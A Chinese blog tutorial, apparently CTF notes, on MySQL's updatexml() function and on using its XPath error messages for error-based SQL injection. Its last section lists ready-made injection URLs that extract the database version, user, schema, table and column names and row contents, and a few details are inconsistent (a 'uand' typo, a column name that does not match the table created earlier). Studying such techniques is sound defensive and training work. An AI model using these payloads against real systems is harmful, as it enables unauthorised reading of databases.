---
title: 关于updatexml()报错注入的思考

date: 2019-11-13 9:23:36

categories: [CTF]

tags: [mysql]

---
## 0x01updatexml()的正常作用

updatexml()是MySQL 5.1.5版本中添加了对XML文档进行查询和修改的函数。<!-- more -->其正常语法：
`UPDATEXML (XML_document, XPath_string, new_value);`
第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc
第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。
第三个参数：new_value，String格式，替换查找到的符合条件的数据
作用：改变文档中符合条件的节点的值

如下是关于它正常用法的掩饰。

(1)执行如下sql语言创建环境：

```mysql
CREATE TABLE  xml1 (xxx VARCHAR(150));#创建一个表
INSERT INTO xml1 VALUES
('
<values> 
<name>lexsd6</name>
<text>frist xml date</text>
</values>');#插入第一个数据
INSERT INTO xml1 VALUES
('
<values> 
<name>lexs</name>
<text>secend xml date</text>
</values>');#插入第二个数据


```

(2) 使用`select * from xml1`查看

![updatexml1](iamge-updatexml1.png)



（3）执行`SELECT updatexml(title,'/values/text','one') FROM xml1;`语句。发现执行后，原来有<text>标签的地方连同标签里的内容都被替换成了‘one’。

![image-20200320235648716](image-20200320235648716.png)

## 0x02updatexml()报错注入的原因及注意点

由于updatexml的第二个参数需要<u>**Xpath**</u>格式的字符串,但如果在提交的不符合和Xpath格式,会用报错的形式将执行后的结果回显出了来.

例如:执行sql语句`select updatexml(1,concat(0x7e,(select database()),0x7e),1);`后,可以看到回显:

![image-20200321131351700](image-20200321131351700.png)

如上图,原本`select database()`的地方被执行了,显示出数据库名--bookshop.

在这里要注意的事：

(1.)由于updatexml的保错回显只能返回一个属性，所以如果一个表中用多行，需要用‘limit’来限制行数（元组数）为一。

(2.)在构建第二个参数时，要确保第二个参数不符合Xpath格式。有的函数符合Xpath格式可以用concat('不符合Xpath格式的字符串','要执行的恶意sql语句')来构造''

![image-20200321002711168](image-20200321002711168.png)

(3.)若要注入出的数据格式就是xml结构的数据则可以直接在第二个参数select:

![image-20200321160707020](image-20200321160707020.png)

(4.)用这个方法注出来的数据有长度限制。且在恶意代码前的参数字符越多，注出的有效信息越少。（如下图）.

![image-20200321161640552](image-20200321161640552.png)

so在有一张表有多行时最好用limit 一行一行查询,慎重使用group_concat函数.(group_concat可能显示不全,用substr来截取拼接)

![image-20200324151215694](image-20200324151215694.png)

## 0x03updatexml()的注入

(1.)爆数据库版本信息

http://127.0.0.1/sql.php?id=1 and updatexml(1,concat(0x7e,(SELECT version()),0x7e),1) ;#

(2.)爆出用户

http://127.0.0.1/sql.php?id=1 and updatexml(1,concat(0x7e,(SELECT user()),0x7e),1)  ;#

(3.)爆出所用数据库

http://127.0.0.1/sql.php?id=1 and updatexml(1,concat(0x7e,(SELECT database()),0x7e),1) ；#

(4.)爆全部数据库

http://www.hackblog.cn/sql.php?id=1 and uand  updatexml(1,concat(0x7e,(SELECT schema_name from information_schema.SCHEMATA  limit 0,1),0x7e),1);#

(5.)爆表
http://127.0.0.1/sql.php?id=1 and updatexml(1,concat(0x7e,(SELECT table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e),1);#

(6.)爆字段

http://127.0.0.1/sql.php?id=1 and updatexml(1,concat(0x7e,(SELECT column_name from information_schema.columns where table_name='xml1' limit 0,1),0x7e),1);#

(7.)爆字段内容
http://127.0.0.1/sql.php?id=1 and  updatexml(1,concat(0x7e,(SELECT  title from xml1 limit 0,1),0x7e),1);#















